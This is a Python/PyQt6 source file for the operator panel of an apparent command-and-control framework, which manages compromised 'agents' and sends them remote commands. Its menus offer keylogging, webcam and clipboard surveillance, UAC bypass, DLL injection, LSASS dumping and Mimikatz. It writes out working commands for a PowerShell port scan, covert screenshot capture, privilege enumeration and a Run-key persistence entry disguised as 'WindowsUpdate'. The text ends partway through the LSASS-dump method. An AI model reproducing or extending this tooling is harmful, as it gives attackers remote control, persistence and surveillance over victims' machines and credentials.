
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QTableWidget, QTableWidgetItem, 
                             QHeaderView, QLabel, QAbstractItemView, QMenu, QPushButton, QMessageBox,
                             QInputDialog, QTextEdit, QDialog, QGridLayout, QGroupBox, QLineEdit,
                             QComboBox, QProgressBar, QSplitter, QListWidget, QTabWidget)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal
from PyQt6.QtGui import QAction, QFont
import subprocess
import threading
from datetime import datetime
from ..dialogs.process_monitor_dialog import ProcessMonitorDialog
from ..dialogs.file_manager_dialog import FileManagerDialog
from ..dialogs.enhanced_payload_generator_dialog import EnhancedPayloadGeneratorDialog
from .enhanced_terminal_system import EnhancedAgentInteractionView
from ...utils.icon_manager import icon_manager
from ...generators.enhanced_lolbas_engine import lolbas_engine
from ...core.payload_quality_controller import quality_controller

class AgentManagerView(QWidget):
    command_sent = pyqtSignal(str, str)  # agent_id, command
    
    def __init__(self, c2_server=None):
        super().__init__()
        self.c2_server = c2_server
        self.agents = {}  # Store agent objects with socket references
        self.selected_agent_id = None
        self.init_ui()
        self.setup_auto_refresh()

    def set_c2_server(self, c2_server):
        """Set C2 server reference"""
        self.c2_server = c2_server

    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(5, 5, 5, 5)
        layout.setSpacing(5)

        # Header with agent count and controls
        header_layout = QHBoxLayout()
        
        # Title and count
        title_count_layout = QVBoxLayout()
        title = QLabel("Connected Agents")
        title.setStyleSheet("font-size: 14pt; font-weight: bold; padding: 5px; color: #ffffff;")
        
        self.agent_count = QLabel("Connected Agents: 0")
        self.agent_count.setStyleSheet("color: #00ffff; font-weight: 600; font-size: 11px;")
        
        title_count_layout.addWidget(title)
        title_count_layout.addWidget(self.agent_count)
        header_layout.addLayout(title_count_layout)
        
        header_layout.addStretch()
        
        # Action buttons
        self.refresh_btn = QPushButton("🔄 Refresh")
        self.refresh_btn.clicked.connect(self.refresh_agents)
        self.refresh_btn.setStyleSheet("""
            QPushButton {
                background-color: #5a9fd4;
                border: 1px solid #4a8fc4;
                color: white;
                padding: 5px 10px;
                border-radius: 3px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #6ab0e5;
            }
        """)
        
        self.clear_btn = QPushButton(icon_manager.get_menu_icon("remove"), "Clear")
        self.clear_btn.clicked.connect(self.clear_agents)
        self.clear_btn.setStyleSheet("""
            QPushButton {
                background-color: #d9534f;
                border: 1px solid #c9434f;
                color: white;
                padding: 5px 10px;
                border-radius: 3px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #e9635f;
            }
        """)
        
        # Add payload generator button
        self.payload_gen_btn = QPushButton(icon_manager.get_command_icon("payload"), "Payload Generator")
        self.payload_gen_btn.clicked.connect(self.open_payload_generator)
        self.payload_gen_btn.setStyleSheet("""
            QPushButton {
                background-color: #f0ad4e;
                border: 1px solid #e09d3e;
                color: white;
                padding: 5px 10px;
                border-radius: 3px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #f6ba6a;
            }
        """)
        
        header_layout.addWidget(self.refresh_btn)
        header_layout.addWidget(self.clear_btn)
        header_layout.addWidget(self.payload_gen_btn)
        layout.addLayout(header_layout)

        # Main splitter for agents table and interaction panel
        main_splitter = QSplitter(Qt.Orientation.Vertical)
        
        # Agents table with enhanced columns
        self.agent_table = QTableWidget()
        self.agent_table.setColumnCount(10)
        self.agent_table.setHorizontalHeaderLabels([
            "ID", "External IP", "Internal IP", "Hostname", "Username", 
            "Domain", "Process", "PID", "Arch", "Last Seen"
        ])
        
        # Set column widths for better visibility
        header = self.agent_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed)  # ID
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)  # External IP
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)  # Internal IP
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)  # Hostname
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.Stretch)  # Username
        header.setSectionResizeMode(5, QHeaderView.ResizeMode.Fixed)   # Domain
        header.setSectionResizeMode(6, QHeaderView.ResizeMode.Stretch)  # Process
        header.setSectionResizeMode(7, QHeaderView.ResizeMode.Fixed)   # PID
        header.setSectionResizeMode(8, QHeaderView.ResizeMode.Fixed)   # Arch
        header.setSectionResizeMode(9, QHeaderView.ResizeMode.Stretch)  # Last Seen
        
        self.agent_table.setColumnWidth(0, 60)   # ID
        self.agent_table.setColumnWidth(5, 100)  # Domain
        self.agent_table.setColumnWidth(7, 80)   # PID
        self.agent_table.setColumnWidth(8, 60)   # Arch
        
        self.agent_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.agent_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.agent_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.agent_table.customContextMenuRequested.connect(self.show_agent_context_menu)
        self.agent_table.setAlternatingRowColors(True)
        self.agent_table.itemSelectionChanged.connect(self.on_agent_selection_changed)
        
        # Enhanced styling
        self.agent_table.setStyleSheet("""
            QTableWidget {
                background-color: #1e1e1e;
                color: #e0e0e0;
                gridline-color: #444444;
                border: 1px solid #3c3c3c;
                selection-background-color: #2d5aa0;
                alternate-background-color: #2a2a2a;
            }
            QHeaderView::section {
                background-color: #3c3c3c;
                color: #ffffff;
                padding: 8px 4px;
                border: 1px solid #5a5a5a;
                font-weight: bold;
                font-size: 10px;
            }
            QTableWidget::item {
                padding: 5px;
                border-bottom: 1px solid #333333;
            }
            QTableWidget::item:selected {
                background-color: #2d5aa0;
                color: white;
            }
        """)
        
        main_splitter.addWidget(self.agent_table)
        
        # Enhanced Interaction panel with terminal system
        self.interaction_panel = EnhancedAgentInteractionView()
        self.interaction_panel.command_sent.connect(self.send_agent_command)
        main_splitter.addWidget(self.interaction_panel)
        
        main_splitter.setSizes([400, 600])  # Give more space to interaction panel
        layout.addWidget(main_splitter)

    def send_agent_command(self, agent_id, command):
        """Send command to agent via C2 server"""
        if self.c2_server and agent_id in self.agents:
            try:
                # Send command through C2 server
                self.c2_server.send_command_to_agent(agent_id, command)
                print(f"Sent command to agent {agent_id}: {command}")
            except Exception as e:
                print(f"Error sending command to agent {agent_id}: {e}")

    def on_agent_selection_changed(self):
        """Handle agent selection change"""
        selected_items = self.agent_table.selectedItems()
        if selected_items:
            row = selected_items[0].row()
            agent_id = self.agent_table.item(row, 0).text()
            self.selected_agent_id = agent_id
            
            # Update interaction panel
            self.interaction_panel.set_current_agent(agent_id)
            
            print(f"Selected agent: {agent_id}")

    def handle_command_response(self, agent_id, command, response):
        """Handle command response from agent"""
        # Forward to enhanced terminal system
        if hasattr(self, 'interaction_panel'):
            self.interaction_panel.handle_command_response(agent_id, command, response)
    
    def log_to_terminal(self, agent_id, message, message_type="info"):
        """Log message to enhanced terminal"""
        if hasattr(self, 'interaction_panel') and hasattr(self.interaction_panel, 'terminal_output'):
            self.interaction_panel.terminal_output.append_output(agent_id, "", message, message_type)
        else:
            # Fallback to console
            print(f"[{agent_id}] {message}")
    
    def send_command_to_agent(self, agent_id, command):
        """Send command to agent and log to terminal"""
        # Log command being sent
        self.log_to_terminal(agent_id, command, "command")
        
        # Send via agent manager
        if hasattr(self, 'send_agent_command'):
            self.send_agent_command(agent_id, command)
        elif self.c2_server:
            try:
                self.c2_server.send_command_to_agent(agent_id, command)
            except Exception as e:
                self.log_to_terminal(agent_id, f"Failed to send command: {str(e)}", "error")

    def setup_auto_refresh(self):
        """Setup auto-refresh timer"""
        self.refresh_timer = QTimer()
        self.refresh_timer.timeout.connect(self.update_last_seen)
        self.refresh_timer.start(5000)  # Update every 5 seconds

    def add_agent(self, agent_data):
        """Add new agent with comprehensive error handling"""
        try:
            if not agent_data:
                print("Error: Empty agent data received")
                return
                
            # Validate agent data
            agent_id = str(agent_data.get("id"))
            if not agent_id or agent_id == "None":
                print("Error: Invalid agent ID")
                return
                
            # Check if agent already exists
            if agent_id in self.agents:
                print(f"Agent {agent_id} already exists, updating...")
                self.update_agent(agent_id, agent_data)
                return
            
            # Add new row safely
            try:
                row_position = self.agent_table.rowCount()
                self.agent_table.insertRow(row_position)
                
                # Store agent reference
                self.agents[agent_id] = agent_data
                
                # Enhanced agent data display with safe defaults
                items = [
                    agent_id,
                    str(agent_data.get("external_ip", agent_data.get("address", "Unknown"))),
                    str(agent_data.get("internal_ip", agent_data.get("address", "Unknown"))),
                    str(agent_data.get("hostname", "Unknown")),
                    str(agent_data.get("user", "Unknown")),
                    str(agent_data.get("domain", "WORKGROUP")),
                    str(agent_data.get("process", "Unknown")),
                    str(agent_data.get("pid", "0")),
                    str(agent_data.get("arch", "x64")),
                    str(agent_data.get("last_seen", datetime.now().strftime("%H:%M:%S")))
                ]
                
                # Add items to table with error handling
                for col, item in enumerate(items):
                    try:
                        table_item = QTableWidgetItem(str(item))
                        # Color coding for important information
                        if col == 4 and "admin" in str(item).lower():  # Username with admin
                            table_item.setBackground(Qt.GlobalColor.darkRed)
                            table_item.setForeground(Qt.GlobalColor.white)
                        elif col == 8 and "x64" in str(item):  # Architecture
                            table_item.setForeground(Qt.GlobalColor.green)
                        
                        self.agent_table.setItem(row_position, col, table_item)
                    except Exception as e:
                        print(f"Error setting table item at row {row_position}, col {col}: {e}")
                        # Set a safe default item
                        self.agent_table.setItem(row_position, col, QTableWidgetItem("Error"))
                
                # Update UI
                self.update_agent_count()
                print(f"Successfully added agent {agent_id}")
                
            except Exception as e:
                print(f"Error adding agent to table: {e}")
                # Try to remove the row if it was partially added
                try:
                    if row_position < self.agent_table.rowCount():
                        self.agent_table.removeRow(row_position)
                except:
                    pass
                    
        except Exception as e:
            print(f"Critical error in add_agent: {e}")
    
    def update_agent(self, agent_id, agent_data):
        """Update existing agent with error handling"""
        try:
            # Find the agent row
            for row in range(self.agent_table.rowCount()):
                item = self.agent_table.item(row, 0)
                if item and item.text() == agent_id:
                    # Update last seen time
                    last_seen_item = self.agent_table.item(row, 9)
                    if last_seen_item:
                        last_seen_item.setText(datetime.now().strftime("%H:%M:%S"))
                    break
                    
            # Update stored data
            self.agents[agent_id] = agent_data
            
        except Exception as e:
            print(f"Error updating agent {agent_id}: {e}")

    def show_agent_context_menu(self, position):
        """Show comprehensive context menu for agent"""
        selected = self.agent_table.selectionModel().selectedRows()
        if not selected:
            return
        
        row = selected[0].row()
        agent_id = self.agent_table.item(row, 0).text()
        self.selected_agent_id = agent_id
        
        context_menu = QMenu()
        
        # Basic agent actions with professional icons
        send_cmd_action = QAction(icon_manager.get_menu_icon("terminal"), "Send Command", self)
        send_cmd_action.triggered.connect(self.send_command_from_menu)
        
        interact_action = QAction(icon_manager.get_menu_icon("terminal"), "Interactive Shell", self)
        interact_action.triggered.connect(self.open_interactive_shell)
        
        context_menu.addAction(send_cmd_action)
        context_menu.addAction(interact_action)
        context_menu.addSeparator()
        
        # System information with professional icons
        sysinfo_menu = QMenu("System Information", self)
        sysinfo_menu.setIcon(icon_manager.get_menu_icon("system_info"))
        
        basic_info_action = QAction(icon_manager.get_command_icon("system"), "Basic System Info", self)
        basic_info_action.triggered.connect(self.get_system_info)
        
        detailed_info_action = QAction(icon_manager.get_command_icon("system"), "Detailed System Info", self)
        detailed_info_action.triggered.connect(self.get_detailed_system_info)
        
        env_vars_action = QAction(icon_manager.get_command_icon("system"), "Environment Variables", self)
        env_vars_action.triggered.connect(self.get_environment_variables)
        
        installed_software_action = QAction(icon_manager.get_command_icon("system"), "Installed Software", self)
        installed_software_action.triggered.connect(self.get_installed_software)
        
        sysinfo_menu.addAction(basic_info_action)
        sysinfo_menu.addAction(detailed_info_action)
        sysinfo_menu.addAction(env_vars_action)
        sysinfo_menu.addAction(installed_software_action)
        
        # File operations with professional icons
        file_menu = QMenu("File Operations", self)
        file_menu.setIcon(icon_manager.get_menu_icon("file_manager"))
        
        file_manager_action = QAction(icon_manager.get_menu_icon("file_manager"), "File Manager", self)
        file_manager_action.triggered.connect(self.open_file_manager)
        
        download_action = QAction(icon_manager.get_command_icon("download"), "Download File", self)
        download_action.triggered.connect(self.download_file)
        
        upload_action = QAction(icon_manager.get_command_icon("upload"), "Upload File", self)
        upload_action.triggered.connect(self.upload_file)
        
        search_files_action = QAction(icon_manager.get_command_icon("file"), "Search Files", self)
        search_files_action.triggered.connect(self.search_files)
        
        file_menu.addAction(file_manager_action)
        file_menu.addAction(download_action)
        file_menu.addAction(upload_action)
        file_menu.addAction(search_files_action)
        
        # Process management with professional icons
        process_menu = QMenu("Process Management", self)
        process_menu.setIcon(icon_manager.get_menu_icon("process_monitor"))
        
        process_list_action = QAction(icon_manager.get_command_icon("process"), "List Processes", self)
        process_list_action.triggered.connect(self.show_process_list)
        
        kill_process_action = QAction(icon_manager.get_command_icon("process"), "Kill Process", self)
        kill_process_action.triggered.connect(self.kill_process)
        
        start_process_action = QAction(icon_manager.get_command_icon("execute"), "Start Process", self)
        start_process_action.triggered.connect(self.start_process)
        
        process_menu.addAction(process_list_action)
        process_menu.addAction(kill_process_action)
        process_menu.addAction(start_process_action)
        
        # Network operations with professional icons
        network_menu = QMenu("Network Operations", self)
        network_menu.setIcon(icon_manager.get_menu_icon("network"))
        
        netstat_action = QAction(icon_manager.get_command_icon("network"), "Network Connections", self)
        netstat_action.triggered.connect(self.show_network_info)
        
        port_scan_action = QAction(icon_manager.get_command_icon("network"), "Port Scan", self)
        port_scan_action.triggered.connect(self.port_scan)
        
        arp_table_action = QAction(icon_manager.get_command_icon("network"), "ARP Table", self)
        arp_table_action.triggered.connect(self.show_arp_table)
        
        dns_lookup_action = QAction(icon_manager.get_command_icon("network"), "DNS Lookup", self)
        dns_lookup_action.triggered.connect(self.dns_lookup)
        
        network_menu.addAction(netstat_action)
        network_menu.addAction(port_scan_action)
        network_menu.addAction(arp_table_action)
        network_menu.addAction(dns_lookup_action)
        
        # Surveillance with professional icons
        surveillance_menu = QMenu("Surveillance", self)
        surveillance_menu.setIcon(icon_manager.get_menu_icon("monitor"))
        
        screenshot_action = QAction(icon_manager.get_menu_icon("screenshot"), "Screenshot", self)
        screenshot_action.triggered.connect(self.take_screenshot)
        
        webcam_action = QAction(icon_manager.get_menu_icon("webcam"), "Webcam Snapshot", self)
        webcam_action.triggered.connect(self.take_webcam_snapshot)
        
        keylogger_action = QAction(icon_manager.get_menu_icon("keylogger"), "Keylogger", self)
        keylogger_action.triggered.connect(self.start_keylogger)
        
        clipboard_action = QAction(icon_manager.get_menu_icon("clipboard"), "Clipboard Monitor", self)
        clipboard_action.triggered.connect(self.monitor_clipboard)
        
        surveillance_menu.addAction(screenshot_action)
        surveillance_menu.addAction(webcam_action)
        surveillance_menu.addAction(keylogger_action)
        surveillance_menu.addAction(clipboard_action)
        
        # Persistence with professional icons
        persistence_menu = QMenu("Persistence", self)
        persistence_menu.setIcon(icon_manager.get_menu_icon("persistence"))
        
        registry_persist_action = QAction(icon_manager.get_menu_icon("registry"), "Registry Persistence", self)
        registry_persist_action.triggered.connect(self.add_registry_persistence)
        
        service_persist_action = QAction(icon_manager.get_menu_icon("services"), "Service Persistence", self)
        service_persist_action.triggered.connect(self.add_service_persistence)
        
        startup_persist_action = QAction(icon_manager.get_menu_icon("persistence"), "Startup Persistence", self)
        startup_persist_action.triggered.connect(self.add_startup_persistence)
        
        scheduled_task_action = QAction(icon_manager.get_menu_icon("persistence"), "Scheduled Task", self)
        scheduled_task_action.triggered.connect(self.add_scheduled_task)
        
        persistence_menu.addAction(registry_persist_action)
        persistence_menu.addAction(service_persist_action)
        persistence_menu.addAction(startup_persist_action)
        persistence_menu.addAction(scheduled_task_action)
        
        # Privilege escalation with professional icons
        privesc_menu = QMenu("Privilege Escalation", self)
        privesc_menu.setIcon(icon_manager.get_menu_icon("privilege_escalation"))
        
        uac_bypass_action = QAction(icon_manager.get_menu_icon("privilege_escalation"), "UAC Bypass", self)
        uac_bypass_action.triggered.connect(self.attempt_uac_bypass)
        
        token_impersonation_action = QAction(icon_manager.get_menu_icon("privilege_escalation"), "Token Impersonation", self)
        token_impersonation_action.triggered.connect(self.attempt_token_impersonation)
        
        privesc_enum_action = QAction(icon_manager.get_menu_icon("privilege_escalation"), "Privilege Escalation Enumeration", self)
        privesc_enum_action.triggered.connect(self.enumerate_privesc)
        
        privesc_menu.addAction(uac_bypass_action)
        privesc_menu.addAction(token_impersonation_action)
        privesc_menu.addAction(privesc_enum_action)
        
        # Advanced operations with professional icons
        advanced_menu = QMenu("Advanced", self)
        advanced_menu.setIcon(icon_manager.get_menu_icon("stealth"))
        
        migrate_process_action = QAction(icon_manager.get_command_icon("stealth"), "Migrate Process", self)
        migrate_process_action.triggered.connect(self.migrate_process)
        
        inject_dll_action = QAction(icon_manager.get_command_icon("execute"), "DLL Injection", self)
        inject_dll_action.triggered.connect(self.inject_dll)
        
        dump_lsass_action = QAction(icon_manager.get_menu_icon("credentials"), "Dump LSASS", self)
        dump_lsass_action.triggered.connect(self.dump_lsass)
        
        mimikatz_action = QAction(icon_manager.get_menu_icon("credentials"), "Execute Mimikatz", self)
        mimikatz_action.triggered.connect(self.execute_mimikatz)
        
        powerview_action = QAction(icon_manager.get_menu_icon("lateral_movement"), "PowerView Enumeration", self)
        powerview_action.triggered.connect(self.execute_powerview)
        
        advanced_menu.addAction(migrate_process_action)
        advanced_menu.addAction(inject_dll_action)
        advanced_menu.addAction(dump_lsass_action)
        advanced_menu.addAction(mimikatz_action)
        advanced_menu.addAction(powerview_action)
        
        # Add all menus to context menu
        context_menu.addMenu(sysinfo_menu)
        context_menu.addMenu(file_menu)
        context_menu.addMenu(process_menu)
        context_menu.addMenu(network_menu)
        context_menu.addMenu(surveillance_menu)
        context_menu.addSeparator()
        context_menu.addMenu(persistence_menu)
        context_menu.addMenu(privesc_menu)
        context_menu.addMenu(advanced_menu)
        context_menu.addSeparator()
        
        # Management actions with professional icons
        refresh_action = QAction(icon_manager.get_menu_icon("refresh"), "Refresh Agent", self)
        refresh_action.triggered.connect(self.refresh_single_agent)
        
        disconnect_action = QAction(icon_manager.get_menu_icon("disconnect"), "Disconnect Agent", self)
        disconnect_action.triggered.connect(self.disconnect_agent)
        
        remove_action = QAction(icon_manager.get_menu_icon("remove"), "Remove from List", self)
        remove_action.triggered.connect(self.remove_agent)
        
        context_menu.addAction(refresh_action)
        context_menu.addAction(disconnect_action)
        context_menu.addAction(remove_action)
        
        # Show menu
        context_menu.exec(self.agent_table.mapToGlobal(position))

    # ========== Command Execution Methods ==========
    
    def send_command(self):
        """Send command from input field"""
        if not self.selected_agent_id:
            selected = self.agent_table.selectionModel().selectedRows()
            if not selected:
                QMessageBox.warning(self, "No Agent Selected", "Please select an agent first.")
                return
            self.selected_agent_id = self.agent_table.item(selected[0].row(), 0).text()
        
        command = self.command_input.text().strip()
        if not command:
            return
        
        self.execute_command(self.selected_agent_id, command)
        self.command_input.clear()
    
    def send_command_from_menu(self):
        """Send command via dialog"""
        if not self.selected_agent_id:
            return
        
        command, ok = QInputDialog.getText(self, 'Send Command', 
                                         f'Enter command for agent {self.selected_agent_id}:')
        if ok and command.strip():
            self.execute_command(self.selected_agent_id, command.strip())
    
    def execute_command(self, agent_id, command):
        """Execute command on agent"""
        # Send command using the enhanced terminal system
        self.send_command_to_agent(agent_id, command)

    def handle_command_response_old(self, agent_id, response):
        """Handle command response from agent (legacy method)"""
        if agent_id == self.selected_agent_id:
            # Forward to new terminal system
            self.log_to_terminal(agent_id, str(response), "stdout")

    def _format_response(self, response):
        """Format agent response for display"""
        if not response or not response.strip():
            return "[No output]"
        
        # Clean up response
        lines = response.strip().split('\n')
        formatted_lines = []
        
        for line in lines:
            line = line.strip()
            if line:
                formatted_lines.append(line)
        
        return '\n'.join(formatted_lines) if formatted_lines else "[No output]"

    # ========== System Information Methods ==========
    
    def get_system_info(self):
        """Get basic system information"""
        if not self.selected_agent_id:
            return
        
        self.execute_command(self.selected_agent_id, "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"")
    
    def get_detailed_system_info(self):
        """Get detailed system information"""
        if not self.selected_agent_id:
            return
        
        commands = [
            "systeminfo",
            "wmic computersystem get TotalPhysicalMemory,NumberOfProcessors",
            "wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors",
            "wmic diskdrive get Size,Model"
        ]
        
        for cmd in commands:
            self.execute_command(self.selected_agent_id, cmd)
    
    def get_environment_variables(self):
        """Get environment variables"""
        if not self.selected_agent_id:
            return
        
        self.execute_command(self.selected_agent_id, "set")
    
    def get_installed_software(self):
        """Get installed software list"""
        if not self.selected_agent_id:
            return
        
        self.execute_command(self.selected_agent_id, "wmic product get Name,Version,Vendor")

    # ========== File Operations Methods ==========
    
    def open_file_manager(self):
        """Open advanced file manager dialog"""
        if not self.selected_agent_id:
            selected = self.agent_table.selectionModel().selectedRows()
            if not selected:
                QMessageBox.warning(self, "No Agent Selected", "Please select an agent first.")
                return
            self.selected_agent_id = self.agent_table.item(selected[0].row(), 0).text()
        
        # Open advanced file manager dialog
        try:
            dialog = FileManagerDialog(self.selected_agent_id, self)
            dialog.command_executed.connect(self.execute_command)
            dialog.exec()
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to open file manager: {str(e)}")
            # Fallback to simple directory listing
            self.execute_command(self.selected_agent_id, "dir /a")
    
    def download_file(self):
        """Download file from agent"""
        if not self.selected_agent_id:
            return
        
        file_path, ok = QInputDialog.getText(self, 'Download File', 
                                           'Enter full path of file to download:')
        if ok and file_path.strip():
            self.log_to_terminal(str(self.selected_agent_id), "[DOWNLOAD] Downloading {file_path} from " + str(self.selected_agent_id) + "", "info")
            # Here you would implement actual file download
    
    def upload_file(self):
        """Upload file to agent"""
        if not self.selected_agent_id:
            return
        
        local_path, ok = QInputDialog.getText(self, 'Upload File', 
                                            'Enter local file path to upload:')
        if ok and local_path.strip():
            remote_path, ok2 = QInputDialog.getText(self, 'Upload File', 
                                                   'Enter remote destination path:')
            if ok2 and remote_path.strip():
                self.log_to_terminal(str(self.selected_agent_id), "[UPLOAD] Uploading {local_path} to {remote_path} on " + str(self.selected_agent_id) + "", "info")
    
    def search_files(self):
        """Search for files on agent"""
        if not self.selected_agent_id:
            return
        
        search_term, ok = QInputDialog.getText(self, 'Search Files', 
                                             'Enter filename or pattern to search:')
        if ok and search_term.strip():
            self.execute_command(self.selected_agent_id, f'dir /s /b "*{search_term}*"')

    # ========== Process Management Methods ==========
    
    def show_process_list(self):
        """Show advanced process monitor"""
        if not self.selected_agent_id:
            selected = self.agent_table.selectionModel().selectedRows()
            if not selected:
                QMessageBox.warning(self, "No Agent Selected", "Please select an agent first.")
                return
            self.selected_agent_id = self.agent_table.item(selected[0].row(), 0).text()
        
        # Open advanced process monitor dialog
        try:
            dialog = ProcessMonitorDialog(self.selected_agent_id, self)
            dialog.command_executed.connect(self.execute_command)
            dialog.exec()
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to open process monitor: {str(e)}")
            # Fallback to simple process list
            self.execute_command(self.selected_agent_id, "tasklist /fo table")
    
    def kill_process(self):
        """Kill a process"""
        if not self.selected_agent_id:
            return
        
        process_name, ok = QInputDialog.getText(self, 'Kill Process', 
                                              'Enter process name or PID:')
        if ok and process_name.strip():
            if process_name.isdigit():
                self.execute_command(self.selected_agent_id, f"taskkill /PID {process_name} /F")
            else:
                self.execute_command(self.selected_agent_id, f"taskkill /IM {process_name} /F")
    
    def start_process(self):
        """Start a new process"""
        if not self.selected_agent_id:
            return
        
        process_path, ok = QInputDialog.getText(self, 'Start Process', 
                                              'Enter process path/command:')
        if ok and process_path.strip():
            self.execute_command(self.selected_agent_id, f"start {process_path}")

    # ========== Network Operations Methods ==========
    
    def show_network_info(self):
        """Show network information"""
        if not self.selected_agent_id:
            return
        
        commands = [
            "ipconfig /all",
            "netstat -an",
            "route print"
        ]
        
        for cmd in commands:
            self.execute_command(self.selected_agent_id, cmd)
    
    def port_scan(self):
        """Perform port scan"""
        if not self.selected_agent_id:
            return
        
        target, ok = QInputDialog.getText(self, 'Port Scan', 
                                        'Enter target IP or hostname:')
        if ok and target.strip():
            # Simple port scan using PowerShell
            cmd = f'powershell "1..1000 | % {{echo ((new-object Net.Sockets.TcpClient).Connect(\\"{target}\\", $_)) \\\"Port $_ is open\\\"}} 2>$null"'
            self.execute_command(self.selected_agent_id, cmd)
    
    def show_arp_table(self):
        """Show ARP table"""
        if not self.selected_agent_id:
            return
        
        self.execute_command(self.selected_agent_id, "arp -a")
    
    def dns_lookup(self):
        """Perform DNS lookup"""
        if not self.selected_agent_id:
            return
        
        domain, ok = QInputDialog.getText(self, 'DNS Lookup', 
                                        'Enter domain to lookup:')
        if ok and domain.strip():
            self.execute_command(self.selected_agent_id, f"nslookup {domain}")

    # ========== Surveillance Methods ==========
    
    def take_screenshot(self):
        """Take screenshot"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[SCREENSHOT] Taking screenshot on " + str(self.selected_agent_id) + "", "info")
        # PowerShell screenshot command
        cmd = 'powershell "Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size); $bitmap.Save(\\"screenshot.png\\"); echo \\"Screenshot saved\\""'
        self.execute_command(self.selected_agent_id, cmd)
    
    def take_webcam_snapshot(self):
        """Take webcam snapshot"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[WEBCAM] Taking webcam snapshot on " + str(self.selected_agent_id) + "", "info")
    
    def start_keylogger(self):
        """Start keylogger"""
        if not self.selected_agent_id:
            return
        
        reply = QMessageBox.question(self, 'Start Keylogger',
                                   f'Start keylogger on {self.selected_agent_id}?',
                                   QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.Yes:
            self.log_to_terminal(str(self.selected_agent_id), "[KEYLOGGER] Keylogger started on " + str(self.selected_agent_id) + "", "info")
    
    def monitor_clipboard(self):
        """Monitor clipboard"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[CLIPBOARD] Monitoring clipboard on " + str(self.selected_agent_id) + "", "info")

    # ========== Persistence Methods ==========
    
    def add_registry_persistence(self):
        """Add registry persistence"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[PERSISTENCE] Adding registry persistence on " + str(self.selected_agent_id) + "", "info")
        cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\System32\\svchost.exe" /f'
        self.execute_command(self.selected_agent_id, cmd)
    
    def add_service_persistence(self):
        """Add service persistence"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[PERSISTENCE] Adding service persistence on " + str(self.selected_agent_id) + "", "info")
    
    def add_startup_persistence(self):
        """Add startup persistence"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[PERSISTENCE] Adding startup persistence on " + str(self.selected_agent_id) + "", "info")
    
    def add_scheduled_task(self):
        """Add scheduled task persistence"""
        if not self.selected_agent_id:
            return
        
        task_name, ok = QInputDialog.getText(self, 'Scheduled Task', 
                                           'Enter task name:')
        if ok and task_name.strip():
            self.log_to_terminal(str(self.selected_agent_id), "[PERSISTENCE] Adding scheduled task '{task_name}' on " + str(self.selected_agent_id) + "", "info")

    # ========== Privilege Escalation Methods ==========
    
    def attempt_uac_bypass(self):
        """Attempt UAC bypass"""
        if not self.selected_agent_id:
            return
        
        reply = QMessageBox.question(self, 'UAC Bypass',
                                   f'Attempt UAC bypass on {self.selected_agent_id}?',
                                   QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.Yes:
            self.log_to_terminal(str(self.selected_agent_id), "[UAC_BYPASS] Attempting UAC bypass on " + str(self.selected_agent_id) + "", "info")
    
    def attempt_token_impersonation(self):
        """Attempt token impersonation"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[TOKEN_IMPERSONATION] Attempting token impersonation on " + str(self.selected_agent_id) + "", "info")
    
    def enumerate_privesc(self):
        """Enumerate privilege escalation opportunities"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[PRIVESC_ENUM] Enumerating privilege escalation opportunities on " + str(self.selected_agent_id) + "", "info")
        
        commands = [
            "whoami /priv",
            "whoami /groups",
            "net localgroup administrators",
            "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
            "wmic service get Name,StartMode,State,PathName"
        ]
        
        for cmd in commands:
            self.execute_command(self.selected_agent_id, cmd)

    # ========== Advanced Methods ==========
    
    def migrate_process(self):
        """Migrate to another process"""
        if not self.selected_agent_id:
            return
        
        process_name, ok = QInputDialog.getText(self, 'Process Migration', 
                                              'Enter target process name or PID:')
        if ok and process_name.strip():
            self.log_to_terminal(str(self.selected_agent_id), "[MIGRATION] Migrating to {process_name} on " + str(self.selected_agent_id) + "", "info")
    
    def inject_dll(self):
        """Inject DLL into process"""
        if not self.selected_agent_id:
            return
        
        dll_path, ok = QInputDialog.getText(self, 'DLL Injection', 
                                          'Enter DLL path:')
        if ok and dll_path.strip():
            self.log_to_terminal(str(self.selected_agent_id), "[DLL_INJECTION] Injecting {dll_path} on " + str(self.selected_agent_id) + "", "info")
    
    def dump_lsass(self):
